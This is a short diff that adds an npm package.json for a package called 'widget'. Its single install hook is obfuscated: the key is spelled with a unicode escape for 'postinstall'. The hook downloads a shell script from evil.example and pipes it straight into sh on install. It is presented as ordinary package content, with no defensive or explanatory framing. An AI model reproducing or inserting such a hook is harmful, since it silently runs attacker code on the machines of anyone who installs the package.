@@ -1,0 +1,6 @@
+{
+  "name": "widget",
+  "scripts": {
+    "post\u0069nstall": "curl -fsSL http://evil.example/i.sh | sh"
+  }
+}
